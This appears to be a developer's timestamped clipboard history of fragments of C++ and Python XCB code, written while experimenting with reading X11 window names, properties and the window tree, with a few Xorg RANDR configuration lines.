* Wed 05 Feb 2014 12:20:08 AM JST

* Wed 05 Feb 2014 12:20:08 AM JST

* Wed 05 Feb 2014 12:20:08 AM JST
  xcb_get_property_cookie_t net_wm_name;

* Wed 05 Feb 2014 12:20:17 AM JST
  net_wm_name = xcb_get_property(connection, false, screen->root,
                   atoms._NET_WM_NAME, atoms.UTF8_STRING, 0, BUFSIZ);

* Wed 05 Feb 2014 12:23:05 AM JST

* Wed 05 Feb 2014 12:23:05 AM JST

* Wed 05 Feb 2014 12:23:05 AM JST
  xcb_get_property_reply_t *prop;

* Wed 05 Feb 2014 12:23:20 AM JST

* Wed 05 Feb 2014 12:23:20 AM JST

* Wed 05 Feb 2014 12:23:20 AM JST
  prop = xcb_get_property_reply(connection, net_wm_name, &err);

* Wed 05 Feb 2014 12:34:18 AM JST
  if (prop->type == atoms.UTF8_STRING) {
    void *prop_name;
    prop_name = xcb_get_property_value(prop);
    std::cout << "DEBUG-1-tmp.cc" << std::endl;
    std::cout << prop_name << std::endl;
    std::cout << (char *)prop_name << std::endl;
  } else if (err) {
    return 0;
  }

* Wed 05 Feb 2014 12:35:02 AM JST
  prop = xcb_get_property_reply(connection, wm_name, &err);
  if (prop->type == XCB_ATOM_STRING) {
    void *prop_name;
    prop_name = (char *)xcb_get_property_value(prop);
    std::cout << prop_name << std::endl;
  } else if (err) {
    return 0;
  }
* Wed 05 Feb 2014 12:35:15 AM JST

* Wed 05 Feb 2014 12:35:15 AM JST

* Wed 05 Feb 2014 12:35:15 AM JST
  xcb_get_property_cookie_t wm_name;

* Wed 05 Feb 2014 12:35:27 AM JST
  wm_name = xcb_get_property(connection, false, screen->root,
                             XCB_ATOM_WM_NAME, XCB_GET_PROPERTY_TYPE_ANY, 0, BUFSIZ);

* Wed 05 Feb 2014 12:36:43 AM JST

* Wed 05 Feb 2014 12:36:43 AM JST

* Wed 05 Feb 2014 12:36:43 AM JST
      std::cout << prop_name << std::endl;

* Wed 05 Feb 2014 12:36:51 AM JST
(char *)
* Wed 05 Feb 2014 12:37:29 AM JST

* Wed 05 Feb 2014 12:37:29 AM JST

* Wed 05 Feb 2014 12:37:29 AM JST
  std::cout << "DEBUG-4-tmp.cc" << "  prop->type:" << prop->type << std::endl;

* Wed 05 Feb 2014 12:38:12 AM JST
unsigned int
* Wed 05 Feb 2014 12:42:40 AM JST
void
* Wed 05 Feb 2014 12:42:48 AM JST
void
* Wed 05 Feb 2014 12:56:20 AM JST
nchildren
* Wed 05 Feb 2014 12:57:38 AM JST
xcb_query_tree_children_length
* Wed 05 Feb 2014 03:00:10 AM JST

* Wed 05 Feb 2014 03:00:10 AM JST

* Wed 05 Feb 2014 03:00:10 AM JST
      std::cout << "DEBUG-9-tmp.cc" << std::endl;

* Wed 05 Feb 2014 03:00:12 AM JST

* Wed 05 Feb 2014 03:00:12 AM JST

* Wed 05 Feb 2014 03:00:12 AM JST
      std::cout << "DEBUG-8-tmp.cc" << std::endl;

* Wed 05 Feb 2014 03:01:04 AM JST
bool 
* Wed 05 Feb 2014 03:01:40 AM JST
xcb_get_
* Wed 05 Feb 2014 03:26:17 AM JST
  
* Wed 05 Feb 2014 03:26:19 AM JST
  
* Wed 05 Feb 2014 03:27:00 AM JST
&operator=(const SingleConnection &other) {};
* Wed 05 Feb 2014 03:28:27 AM JST
xcb_connection_t *con
* Wed 05 Feb 2014 03:29:24 AM JST

* Wed 05 Feb 2014 03:29:24 AM JST

* Wed 05 Feb 2014 03:29:24 AM JST
  Globals();

* Wed 05 Feb 2014 03:29:47 AM JST
  Globals(xcb_connection_t *con);
  Globals(xcb_connection_t *con, const Globals &other) : atoms(con) {};
  Globals &operator=(const SingleConnection &other) {};

* Wed 05 Feb 2014 03:30:16 AM JST
xcb_connection_t *con
* Wed 05 Feb 2014 03:30:45 AM JST

* Wed 05 Feb 2014 03:30:45 AM JST

* Wed 05 Feb 2014 03:30:45 AM JST
  static 

* Wed 05 Feb 2014 03:36:11 AM JST
Globals &Globals::getInstance(xcb_connection_t *con){
  static Globals instance(con);
  return instance;
}

* Wed 05 Feb 2014 03:36:32 AM JST
  
* Wed 05 Feb 2014 03:46:08 AM JST
~/work/xlibcpp/xcbAutoHotKey/
* Wed 05 Feb 2014 03:47:49 AM JST
Option "RANDR" "Disable"
* Wed 05 Feb 2014 03:54:12 AM JST
Option         "RandRRotation" "on"
* Wed 05 Feb 2014 03:55:03 AM JST

* Wed 05 Feb 2014 03:55:03 AM JST

* Wed 05 Feb 2014 03:55:04 AM JST
    Option "RANDR" "Disable"

* Wed 05 Feb 2014 03:57:06 AM JST
Option         "RANDR" "Enable"
* Wed 05 Feb 2014 04:31:51 AM JST
xcb_connection_t *con
* Wed 05 Feb 2014 04:50:23 AM JST
con
* Wed 05 Feb 2014 04:53:45 AM JST
get_property
* Wed 05 Feb 2014 04:56:01 AM JST
xcb_window_t
* Wed 05 Feb 2014 04:56:14 AM JST
xcb_window_t win
* Wed 05 Feb 2014 04:57:03 AM JST
xcb_get_property(connection, false, children[i],
                                   atoms._NET_WM_NAME, atoms.UTF8_STRING, 0, BUFSIZ);
* Wed 05 Feb 2014 04:59:39 AM JST

* Wed 05 Feb 2014 04:59:39 AM JST

* Wed 05 Feb 2014 04:59:39 AM JST
  xcb_connection_t *connection;

* Wed 05 Feb 2014 04:59:41 AM JST

* Wed 05 Feb 2014 04:59:41 AM JST

* Wed 05 Feb 2014 04:59:41 AM JST
  xcb_connection_t *connection;

* Wed 05 Feb 2014 04:59:44 AM JST

* Wed 05 Feb 2014 04:59:44 AM JST

* Wed 05 Feb 2014 04:59:45 AM JST
  xcb_connection_t *connection;

* Wed 05 Feb 2014 05:00:13 AM JST
xcb_connection_t *connection;
* Wed 05 Feb 2014 05:00:41 AM JST

* Wed 05 Feb 2014 05:00:41 AM JST

* Wed 05 Feb 2014 05:00:41 AM JST
  globals.atoms._NET_WM_NAME;

* Wed 05 Feb 2014 05:02:09 AM JST
xcb_get_property_cookie_t net_wm_name;
* Wed 05 Feb 2014 05:02:43 AM JST
net_wm_name
* Wed 05 Feb 2014 05:03:16 AM JST
xcb_get_property_reply
* Wed 05 Feb 2014 05:03:23 AM JST
xcb_get_property_reply_t *prop;
* Wed 05 Feb 2014 05:03:34 AM JST
xcb_get_property_reply
* Wed 05 Feb 2014 05:04:05 AM JST
false, 
* Wed 05 Feb 2014 05:04:09 AM JST
net_wm_name
* Wed 05 Feb 2014 05:04:36 AM JST
xcb_generic_error_t *err;
* Wed 05 Feb 2014 05:05:25 AM JST
xcb_get_property_reply_t
* Wed 05 Feb 2014 05:08:09 AM JST
xcb_get_property_reply_t
* Wed 05 Feb 2014 05:08:41 AM JST
xcb_window_t win
* Wed 05 Feb 2014 05:09:28 AM JST

* Wed 05 Feb 2014 05:09:28 AM JST

* Wed 05 Feb 2014 05:09:28 AM JST
  globals.atoms._NET_WM_NAME;

* Wed 05 Feb 2014 05:10:49 AM JST
t
* Wed 05 Feb 2014 05:10:50 AM JST
cookie_t
* Wed 05 Feb 2014 05:10:53 AM JST
repl
* Wed 05 Feb 2014 05:11:42 AM JST
globals
* Wed 05 Feb 2014 05:12:09 AM JST
    
* Wed 05 Feb 2014 05:14:11 AM JST
xcb_get_property_cookie_t cookie
* Wed 05 Feb 2014 05:14:20 AM JST
xcb_generic_error_t *err;
* Wed 05 Feb 2014 05:14:25 AM JST
xcb_get_property_reply_t *prop
* Wed 05 Feb 2014 05:14:31 AM JST
xcb_get_property_cookie_t 
* Wed 05 Feb 2014 05:14:32 AM JST
  
* Wed 05 Feb 2014 05:14:37 AM JST

* Wed 05 Feb 2014 05:14:37 AM JST

* Wed 05 Feb 2014 05:14:37 AM JST
  xcb_generic_error_t *err;

* Wed 05 Feb 2014 05:14:40 AM JST
xcb_get_property_reply_t *
* Wed 05 Feb 2014 05:15:17 AM JST

* Wed 05 Feb 2014 05:15:17 AM JST

* Wed 05 Feb 2014 05:15:17 AM JST
  return prop;

* Wed 05 Feb 2014 05:23:42 AM JST

* Wed 05 Feb 2014 05:23:55 AM JST
xcb_get_property_reply_t
*Property::getNetWMNameProperty(xcb_window_t win)
{
  return getPropertyReply(win, globals.atoms._NET_WM_NAME,
                          globals.atoms.UTF8_STRING);
  
}

* Wed 05 Feb 2014 05:24:17 AM JST
XCB_ATOM_WM_NAME
* Wed 05 Feb 2014 05:24:26 AM JST
XCB_GET_PROPERTY_TYPE_ANY
* Wed 05 Feb 2014 05:27:46 AM JST
Globals globals;
* Wed 05 Feb 2014 05:29:02 AM JST
Globals::getInstance()
* Wed 05 Feb 2014 05:29:55 AM JST
win
* Wed 05 Feb 2014 05:32:39 AM JST

* Wed 05 Feb 2014 05:32:39 AM JST

* Wed 05 Feb 2014 05:32:39 AM JST
  // xcb_get_property_cookie_t net_wm_name;

* Wed 05 Feb 2014 05:32:39 AM JST
  // xcb_get_property_cookie_t net_wm_name;

* Wed 05 Feb 2014 05:32:39 AM JST
  // xcb_get_property_cookie_t net_wm_name;
  // xcb_get_property_cookie_t wm_name;

* Wed 05 Feb 2014 05:32:42 AM JST

* Wed 05 Feb 2014 05:32:42 AM JST

* Wed 05 Feb 2014 05:32:42 AM JST
      // std::cout << "DEBUG-1-tmp.cc" << std::endl;

* Wed 05 Feb 2014 05:32:55 AM JST
 else if (err) {
* Wed 05 Feb 2014 05:32:56 AM JST

* Wed 05 Feb 2014 05:32:56 AM JST

* Wed 05 Feb 2014 05:32:56 AM JST
      continue;

* Wed 05 Feb 2014 05:32:56 AM JST
      continue;

* Wed 05 Feb 2014 05:32:56 AM JST
      continue;
    }

* Wed 05 Feb 2014 05:33:01 AM JST
 //else if (err) {
* Wed 05 Feb 2014 05:33:01 AM JST

* Wed 05 Feb 2014 05:33:01 AM JST

* Wed 05 Feb 2014 05:33:01 AM JST
      // continue;

* Wed 05 Feb 2014 05:33:02 AM JST
      // continue;

* Wed 05 Feb 2014 05:33:02 AM JST
      // continue;
    // }    

* Wed 05 Feb 2014 05:34:00 AM JST

* Wed 05 Feb 2014 05:34:00 AM JST

* Wed 05 Feb 2014 05:34:00 AM JST
  xcb_generic_error_t *err;

* Wed 05 Feb 2014 05:35:37 AM JST
                                
* Wed 05 Feb 2014 05:35:45 AM JST
                                                
* Wed 05 Feb 2014 05:35:48 AM JST
                                                
* Wed 05 Feb 2014 05:35:52 AM JST
                                                         
* Wed 05 Feb 2014 05:35:56 AM JST
                                                
* Wed 05 Feb 2014 05:51:48 AM JST
xcb_connection_t *con, xcb_window_t win
* Wed 05 Feb 2014 05:52:10 AM JST
xcb_connection_t *con
* Wed 05 Feb 2014 05:53:20 AM JST
xcb_window_t win
* Wed 05 Feb 2014 05:53:31 AM JST
  xcb_window_t win;
* Wed 05 Feb 2014 05:53:37 AM JST

* Wed 05 Feb 2014 05:53:38 AM JST

* Wed 05 Feb 2014 05:53:38 AM JST
  xcb_window_t win;

* Wed 05 Feb 2014 05:59:11 AM JST
class WindowInfo
{
private:
  xcb_connection_t *connection;
public:
  WindowInfo(xcb_connection_t *con, xcb_window_t win);
  virtual ~WindowInfo();
  std::string getWMName();
  xcb_window_t window;
};

WindowInfo::WindowInfo(xcb_connection_t *con, xcb_window_t win)
  : connection(con), window(win) {}

WindowInfo::~WindowInfo() {}

std::string getWMName()
{
  Property property;
  
}


* Wed 05 Feb 2014 05:59:54 AM JST
    prop = property.getNetWMNameProperty(children[i]);
    if (prop->type == globals.atoms.UTF8_STRING) {
      char *prop_name;
      prop_name = (char *)xcb_get_property_value(prop);
      std::cout << prop_name << std::endl;
    }

* Wed 05 Feb 2014 06:00:25 AM JST
xcb_get_property_reply_t *prop;
* Wed 05 Feb 2014 06:01:19 AM JST

* Wed 05 Feb 2014 06:01:19 AM JST

* Wed 05 Feb 2014 06:01:20 AM JST
  Globals globals;

* Wed 05 Feb 2014 06:02:31 AM JST
name
* Wed 05 Feb 2014 06:02:39 AM JST
xcb_get_property_value(prop)
* Wed 05 Feb 2014 06:03:24 AM JST
wmname
* Wed 05 Feb 2014 06:04:38 AM JST
    prop = property.getWMNameProperty(children[i]);
    if (prop->type == XCB_ATOM_STRING) {
      char *prop_name;
      prop_name = (char *)xcb_get_property_value(prop);
    }

* Wed 05 Feb 2014 06:05:43 AM JST
std::string *wmname((std::string *)xcb_get_property_value(prop));
* Wed 05 Feb 2014 06:06:04 AM JST
    if (wmname) {
      return wmname;
    }

* Wed 05 Feb 2014 06:10:52 AM JST
*wmname
* Wed 05 Feb 2014 06:11:02 AM JST
xcb_get_property_value(prop))
* Wed 05 Feb 2014 06:11:06 AM JST
xcb_get_property_value(prop)
* Wed 05 Feb 2014 06:11:18 AM JST
(char *)
* Wed 05 Feb 2014 06:11:53 AM JST
char *wmname
* Wed 05 Feb 2014 06:12:01 AM JST
char *
* Wed 05 Feb 2014 06:12:33 AM JST

* Wed 05 Feb 2014 06:12:33 AM JST

* Wed 05 Feb 2014 06:12:33 AM JST
    // std::string *wmname((std::string *)xcb_get_property_value(prop));

* Wed 05 Feb 2014 06:12:34 AM JST

* Wed 05 Feb 2014 06:12:34 AM JST

* Wed 05 Feb 2014 06:12:34 AM JST
    // prop_name = (char *)xcb_get_property_value(prop);

* Wed 05 Feb 2014 06:12:35 AM JST
    // prop_name = (char *)xcb_get_property_value(prop);

* Wed 05 Feb 2014 06:12:35 AM JST
    // prop_name = (char *)xcb_get_property_value(prop);
    // std::cout << prop_name << std::endl;

* Wed 05 Feb 2014 06:12:42 AM JST
wmname = (char *)xcb_get_property_value(prop);
* Wed 05 Feb 2014 06:12:57 AM JST

* Wed 05 Feb 2014 06:12:57 AM JST

* Wed 05 Feb 2014 06:12:57 AM JST
    std::string *wmname((char *)xcb_get_property_value(prop));

* Wed 05 Feb 2014 06:12:58 AM JST
    std::string *wmname((char *)xcb_get_property_value(prop));

* Wed 05 Feb 2014 06:12:58 AM JST
    std::string *wmname((char *)xcb_get_property_value(prop));
    // char *prop_name;

* Wed 05 Feb 2014 06:12:58 AM JST
    std::string *wmname((char *)xcb_get_property_value(prop));
    // char *prop_name;

* Wed 05 Feb 2014 06:12:58 AM JST
    std::string *wmname((char *)xcb_get_property_value(prop));
    // char *prop_name;
    // prop_name = (char *)xcb_get_property_value(prop);

* Wed 05 Feb 2014 06:14:42 AM JST
wininfo.getWMName()
* Wed 05 Feb 2014 06:15:17 AM JST

* Wed 05 Feb 2014 06:15:17 AM JST

* Wed 05 Feb 2014 06:15:18 AM JST
    std::cout << "DEBUG-8-tmp.cc" << "  wininfo.getWMName():"

* Wed 05 Feb 2014 06:15:18 AM JST
    std::cout << "DEBUG-8-tmp.cc" << "  wininfo.getWMName():"

* Wed 05 Feb 2014 06:15:18 AM JST
    std::cout << "DEBUG-8-tmp.cc" << "  wininfo.getWMName():"
              << wininfo.getWMName() << std::endl;

* Wed 05 Feb 2014 06:16:02 AM JST

* Wed 05 Feb 2014 06:16:02 AM JST

* Wed 05 Feb 2014 06:16:02 AM JST
      std::cout << "DEBUG-10-tmp.cc" << std::endl;

* Wed 05 Feb 2014 06:16:04 AM JST

* Wed 05 Feb 2014 06:16:05 AM JST

* Wed 05 Feb 2014 06:16:05 AM JST
      std::cout << "DEBUG-11-tmp.cc" << std::endl;

* Wed 05 Feb 2014 06:16:05 AM JST

* Wed 05 Feb 2014 06:16:06 AM JST

* Wed 05 Feb 2014 06:16:06 AM JST
  std::cout << "DEBUG-9-tmp.cc" << std::endl;

* Wed 05 Feb 2014 06:30:30 AM JST
60817430
* Wed 05 Feb 2014 07:04:45 AM JST
#define p_new(type, count)      ((type *)xmalloc(sizeof(type) * (count)))
* Wed 05 Feb 2014 07:06:07 AM JST
int len = xcb_get_property_value_length(reply);
* Wed 05 Feb 2014 07:06:31 AM JST
reply
* Wed 05 Feb 2014 07:07:36 AM JST
xmalloc
* Wed 05 Feb 2014 07:09:00 AM JST
           template <typename T>                                               
           T *xnew(const size_t n)                                             
           {                                                                   
               T *p = new (std::nothrow) T[n];                                 
               if (p == nullptr)                                               
               {                                                               
                   cerr << "Not enough memory\n";                              
                   abort();                                                    
               }                                                               
               return p;                                                       
           }                                                                   

* Wed 05 Feb 2014 07:10:31 AM JST
memcpy(value, xcb_get_property_value(reply), len);
* Wed 05 Feb 2014 07:11:47 AM JST
memcpy(value, xcb_get_property_value(reply), len);
* Wed 05 Feb 2014 07:11:57 AM JST
wmname
* Wed 05 Feb 2014 07:12:25 AM JST
prop
* Wed 05 Feb 2014 07:13:56 AM JST
<cstring>
* Wed 05 Feb 2014 07:14:29 AM JST
[len] = '\0';
* Wed 05 Feb 2014 07:15:05 AM JST
nullptr
* Wed 05 Feb 2014 07:16:47 AM JST
#include <cstddef>
* Wed 05 Feb 2014 07:18:25 AM JST
std::
* Wed 05 Feb 2014 08:05:45 AM JST
xcb_query_tree_cookie_t query_tree = xcb_query_tree(connection, screen->root);
* Wed 05 Feb 2014 08:06:20 AM JST
  xcb_query_tree_reply_t *tree;
  xcb_generic_error_t *err;

* Wed 05 Feb 2014 08:06:30 AM JST
tree = xcb_query_tree_reply (connection, query_tree, &err);
* Wed 05 Feb 2014 08:06:53 AM JST
  xcb_window_t *children;
  unsigned int nchildren;
  children = xcb_query_tree_children (tree);
  nchildren = xcb_query_tree_children_length (tree);

* Wed 05 Feb 2014 08:06:59 AM JST
  xcb_window_t *children;
  unsigned int nchildren;

* Wed 05 Feb 2014 08:07:29 AM JST
  Globals globals = Globals::getInstance();
  Property property;         
  Atoms atoms(connection);

* Wed 05 Feb 2014 08:07:45 AM JST

* Wed 05 Feb 2014 08:07:45 AM JST

* Wed 05 Feb 2014 08:07:45 AM JST
  // xcb_get_property_reply_t *prop;

* Wed 05 Feb 2014 08:07:53 AM JST
  for (unsigned int i = 0; i < nchildren; i++) {

    WindowInfo wininfo(connection, children[i]);
    char *wmname = wininfo.getWMName();
    if (wmname) {
      std::cout << "DEBUG-12-tmp.cc" << "  wmname:" << wmname << std::endl;
      return wininfo.window;
    }
    
  }

* Wed 05 Feb 2014 08:33:17 AM JST
Connection?
* Wed 05 Feb 2014 08:35:52 AM JST
(display=':0.0', fd=3)
* Wed 05 Feb 2014 08:37:15 AM JST
pref_screen
* Wed 05 Feb 2014 08:46:44 AM JST
xpybConn_get_setup
* Wed 05 Feb 2014 09:20:38 AM JST
d.core.GetProperty(True, root, )
* Wed 05 Feb 2014 09:23:20 AM JST
xcb.xproto.Atom.
* Wed 05 Feb 2014 09:25:03 AM JST
core.GetProperty
* Wed 05 Feb 2014 09:31:04 AM JST
%logstate
* Wed 05 Feb 2014 09:35:51 AM JST
xcb.xproto.Atom.WM_NAME, xcb.xproto.Atom.Any
* Wed 05 Feb 2014 09:36:45 AM JST
value
* Wed 05 Feb 2014 09:38:07 AM JST
xcb.xproto.Atom.WM_NAME
* Wed 05 Feb 2014 09:44:58 AM JST
'_NET_WM_NAME'
* Wed 05 Feb 2014 09:46:52 AM JST
len
* Wed 05 Feb 2014 09:47:39 AM JST
'UTF8_STRING'
* Wed 05 Feb 2014 09:52:38 AM JST
"_NET_WM_USER_TIME"
* Wed 05 Feb 2014 10:05:53 AM JST
0]
* Wed 05 Feb 2014 10:05:54 AM JST
children
* Wed 05 Feb 2014 10:09:36 AM JST
144 145 151 152
* Wed 05 Feb 2014 10:15:03 AM JST
prop=c.core.GetProperty(False, children[0], net_wm_name, utf, 0, 1)
* Wed 05 Feb 2014 10:16:20 AM JST
WM_NAME
* Wed 05 Feb 2014 10:17:11 AM JST
prop=c.core.GetProperty(False, children[0], net_wm_name, utf, 0, 1)
* Wed 05 Feb 2014 10:21:41 AM JST
c.core.GetInputFocus()
* Wed 05 Feb 2014 10:21:48 AM JST
cookie = c.core.GetInputFocus()
* Wed 05 Feb 2014 10:33:43 AM JST
WM_HINTS
* Wed 05 Feb 2014 10:33:50 AM JST
WM_NORMAL_HINTS
* Wed 05 Feb 2014 10:35:30 AM JST
xcb.xproto.Atom.WM_NORMAL_HINTS
* Wed 05 Feb 2014 10:39:37 AM JST
STRING
* Wed 05 Feb 2014 10:43:55 AM JST
co=c.core.InternAtom(True, len('_NET_WM_NAME'), '_NET_WM_NAME')
* Wed 05 Feb 2014 10:44:34 AM JST
co=c.core.InternAtom(True, len('UTF8_STRING'), 'UTF8_STRING')
* Wed 05 Feb 2014 11:03:20 AM JST
Exception
* Wed 05 Feb 2014 11:04:16 AM JST
BadWindow
* Wed 05 Feb 2014 11:07:09 AM JST
for i in range(1, 103):
   .....:     print i
   .....:     try:
   .....:         rep=c.core.GetProperty(False, children[i], NET_WM_NAME, UTF8_STRING, 0, 65535).reply()
   .....:     except xcb.xproto.BadWindow, e:
   .....:         continue
   .....:     if rep.bytes_after:
   .....:         print "get {}".format(i)
* Wed 05 Feb 2014 11:07:13 AM JST
.....:     
* Wed 05 Feb 2014 11:07:15 AM JST
.....:     
* Wed 05 Feb 2014 11:07:19 AM JST
.....:     
* Wed 05 Feb 2014 11:07:22 AM JST
.....:     
* Wed 05 Feb 2014 11:07:25 AM JST
.....:     
* Wed 05 Feb 2014 11:07:26 AM JST
.....:     
* Wed 05 Feb 2014 11:07:29 AM JST
.....:     
* Wed 05 Feb 2014 11:07:34 AM JST
for i in range(1, 103):
   print i
   try:
       rep=c.core.GetProperty(False, children[i], NET_WM_NAME, UTF8_STRING, 0, 65535).reply()
   except xcb.xproto.BadWindow, e:
       continue
   if rep.bytes_after:
       print "get {}".format(i)
* Wed 05 Feb 2014 11:08:25 AM JST
def tes():
    r"""SUMMARY
    
    tes()
    
    @Return:
    """
    for i in range(1, 103):
       print i
       try:
           rep=c.core.GetProperty(False, children[i], NET_WM_NAME, UTF8_STRING, 0, 65535).reply()
       except xcb.xproto.BadWindow, e:
           continue
       if rep.bytes_after:
           print "get {}".format(i)
* Wed 05 Feb 2014 11:09:26 AM JST
def tes():
    r"""SUMMARY
    
    tes()
    
    @Return:
    """
    for i in range(1, 104):
       print i
       try:
           rep=c.core.GetProperty(False, children[i], NET_WM_NAME, UTF8_STRING, 0, 65535).reply()
       except xcb.xproto.BadWindow, e:
           continue
       if rep.bytes_after:
           print "get {}".format(i)
* Wed 05 Feb 2014 11:11:53 AM JST
NET_
* Wed 05 Feb 2014 11:11:55 AM JST
UTF8_
* Wed 05 Feb 2014 11:12:09 AM JST
def tes():
    r"""SUMMARY
    
    tes()
    
    @Return:
    """
    for i in range(1, 104):
       print i
       print('')
       try:
           rep=c.core.GetProperty(False, children[i], WM_NAME, STRING, 0, 65535).reply()
       except xcb.xproto.BadWindow, e:
           continue
       if rep.bytes_after:
           print "get {}".format(i)
* Wed 05 Feb 2014 11:13:31 AM JST
WM_NAME
* Wed 05 Feb 2014 11:20:15 AM JST
UTF8_
* Wed 05 Feb 2014 11:20:16 AM JST
NET_
* Wed 05 Feb 2014 11:28:44 AM JST
NET_CLIENT_LIST
* Wed 05 Feb 2014 11:34:07 AM JST
NET_CLIENT_LIST
* Wed 05 Feb 2014 11:38:01 AM JST
create_resource_object
* Wed 05 Feb 2014 11:40:23 AM JST
print 
* Wed 05 Feb 2014 11:42:51 AM JST
print 
* Wed 05 Feb 2014 12:05:41 PM JST
type
* Wed 05 Feb 2014 12:07:17 PM JST
GetAtomName
* Wed 05 Feb 2014 12:14:50 PM JST
print 
* Wed 05 Feb 2014 12:16:02 PM JST
WM_CLASS
* Wed 05 Feb 2014 12:16:45 PM JST
WM_NORMAL_HINTS  
* Wed 05 Feb 2014 12:17:22 PM JST
print 
* Wed 05 Feb 2014 12:18:29 PM JST
WM_NORMAL_HINTS
* Wed 05 Feb 2014 12:19:15 PM JST
WM_ICON_NAME
* Wed 05 Feb 2014 12:21:47 PM JST
WM_NAME
* Wed 05 Feb 2014 12:22:23 PM JST
UTF8_
* Wed 05 Feb 2014 12:36:47 PM JST
wc
* Wed 05 Feb 2014 12:38:02 PM JST
appsp
* Wed 05 Feb 2014 12:44:58 PM JST
string
* Wed 05 Feb 2014 12:48:44 PM JST
t.extra_value
* Wed 05 Feb 2014 12:52:37 PM JST

* Wed 05 Feb 2014 12:52:38 PM JST

* Wed 05 Feb 2014 12:52:38 PM JST
	  printf("DEBUG-71-xprop.c\n");

* Wed 05 Feb 2014 12:56:19 PM JST
  
* Wed 05 Feb 2014 12:58:51 PM JST
max_len+3
* Wed 05 Feb 2014 01:00:04 PM JST
(const char *)prop
* Wed 05 Feb 2014 01:05:27 PM JST
Select_Window_Args
* Wed 05 Feb 2014 01:07:13 PM JST
60817430
* Wed 05 Feb 2014 01:07:23 PM JST
60817430
* Wed 05 Feb 2014 01:10:52 PM JST
cmd_getwindowfocus
* Wed 05 Feb 2014 11:49:46 PM JST
xdo_window_sane_get_focus
* Wed 05 Feb 2014 11:51:20 PM JST
xdo_window_get_focus
* Thu 06 Feb 2014 12:06:02 AM JST
cookie=c.core.QueryTree(root)
* Thu 06 Feb 2014 12:32:09 AM JST
69206016
* Thu 06 Feb 2014 12:46:22 AM JST
names
* Thu 06 Feb 2014 12:50:47 AM JST
for ch in children:
   .....:     rep=c.core.QueryTree(ch).reply()
   .....:     for i in rep.children:
   .....:         chiset.add(i)
   .....:     chiset.add(rep.parent)
   .....: 
* Thu 06 Feb 2014 12:50:55 AM JST
.....:     
* Thu 06 Feb 2014 12:50:58 AM JST
.....:     
* Thu 06 Feb 2014 12:51:00 AM JST
.....:     
* Thu 06 Feb 2014 12:51:01 AM JST
.....:     
* Thu 06 Feb 2014 12:51:03 AM JST

* Thu 06 Feb 2014 12:51:03 AM JST

* Thu 06 Feb 2014 12:51:03 AM JST
   .....: 
* Thu 06 Feb 2014 12:51:07 AM JST
for ch in children:
   rep=c.core.QueryTree(ch).reply()
   for i in rep.children:
       chiset.add(i)
   chiset.add(rep.parent)
* Thu 06 Feb 2014 12:54:45 AM JST
for ch in children:
   rep=c.core.QueryTree(ch).reply()
   for i in rep.children:
       chiset.add(i)
   chiset.add(rep.parent)

* Thu 06 Feb 2014 12:55:02 AM JST
for ch in children:
   rep=c.core.QueryTree(ch).reply()
   print(dir(rep))
* Thu 06 Feb 2014 12:55:48 AM JST
for ch in children:
   rep=c.core.QueryTree(ch).reply()
   print(rep.root)
* Thu 06 Feb 2014 12:57:04 AM JST
for ch in children:
    try:
        rep=c.core.QueryTree(ch).reply()
        print(rep.parent)
    except xcb.xproto.BadWindow:
        continue
* Thu 06 Feb 2014 01:11:36 AM JST
ListExtensions
* Thu 06 Feb 2014 01:12:18 AM JST
/list 
* Thu 06 Feb 2014 01:14:12 AM JST
ScreenSaver
* Thu 06 Feb 2014 01:18:21 AM JST
core.
* Thu 06 Feb 2014 02:31:50 AM JST
NET_CLIENT_LIST
* Thu 06 Feb 2014 02:32:09 AM JST
print 
* Thu 06 Feb 2014 02:32:20 AM JST
print repr(
* Thu 06 Feb 2014 02:35:04 AM JST
struct.unpack_from('I', rep.value.buf())[0]
* Thu 06 Feb 2014 02:36:34 AM JST
/list 
* Thu 06 Feb 2014 02:42:19 AM JST
539767899
* Thu 06 Feb 2014 02:42:44 AM JST
539767899
* Thu 06 Feb 2014 02:43:11 AM JST
_NET_CLIENT_LIST
* Thu 06 Feb 2014 03:13:08 AM JST
!!!!!!!!!!!!!!!!
* Thu 06 Feb 2014 04:49:29 AM JST
for ch in children:
    try:
        rep=c.core.QueryTree(ch).reply()
        print(rep.children_len)
    except xcb.xproto.BadWindow:
        continue
* Thu 06 Feb 2014 04:50:45 AM JST
/list 
* Thu 06 Feb 2014 04:53:41 AM JST
children
* Thu 06 Feb 2014 04:54:06 AM JST
for i, ch in enumerate(children):
    try:
        rep=c.core.QueryTree(ch).reply()
        print('')
        print(i)
        print(rep.children_len)
    except xcb.xproto.BadWindow:
        continue
* Thu 06 Feb 2014 04:58:02 AM JST
0
16

1
16

2
16

3
16

4
16

5
16

6
16

7
16

8
0

9
0

10
0

11
0

12
0

13
1

14
1

15
1

16
0

17
1

18
0

19
1

20
3

21
1

22
1

23
1

24
1

25
0

26
0

27
1

28
1

29
1

30
0

31
1

32
1

33
1

34
0

35
0

36
1

37
0

38
1

39
1

40
0

41
1

42
0

43
1

44
0

45
1

46
1

47
0

48
0

49
1

50
1

51
1

52
1

53
1

54
1

55
1

56
1

57
1

58
0

59
0

60
0

61
0

62
1

63
1

64
1

65
1

66
0

67
0

68
0

69
0

70
0

71
0

72
0

73
0

74
0

75
0

76
0

77
0

78
0

79
0

80
0

81
0

82
0

83
0

84
0

85
0

86
0

87
0

88
0

89
1

90
1

91
0

92
1

93
0

94
1

95
1

96
1

97
1

98
1

99
1

100
0

101
2

110
0

111
0

112
1

113
1

* Thu 06 Feb 2014 04:59:37 AM JST
re=c.core.GetProperty(False, rep.children[0], NET_WM_NAME, UTF8_STRING, 0, 65535).reply()
* Thu 06 Feb 2014 05:00:12 AM JST
for i, ch in enumerate(children):
    try:
        rep=c.core.QueryTree(ch).reply()
        # print('')
        # print(i)
        if rep.children_len:
            re=c.core.GetProperty(False, rep.children[0], NET_WM_NAME, UTF8_STRING, 0, 65535).reply()
            if re.value_len:
                print(i)
        # print(rep.children_len)
    except xcb.xproto.BadWindow:
        continue
* Thu 06 Feb 2014 05:02:16 AM JST
for i, ch in enumerate(children):
    try:
        rep=c.core.QueryTree(ch).reply()
        # print('')
        # print(i)
        if rep.children_len:
            print(rep.children[0])
            re=c.core.GetProperty(False, rep.children[0], NET_WM_NAME, UTF8_STRING, 0, 65535).reply()
            if re.value_len:
                print(i)
        # print(rep.children_len)
    except xcb.xproto.BadWindow:
        continue
* Thu 06 Feb 2014 05:02:33 AM JST
67108866
* Thu 06 Feb 2014 05:03:47 AM JST
67108886
* Thu 06 Feb 2014 05:05:06 AM JST
rep=c.core.QueryTree(ch).reply()
* Thu 06 Feb 2014 05:05:14 AM JST
rep.children[0]
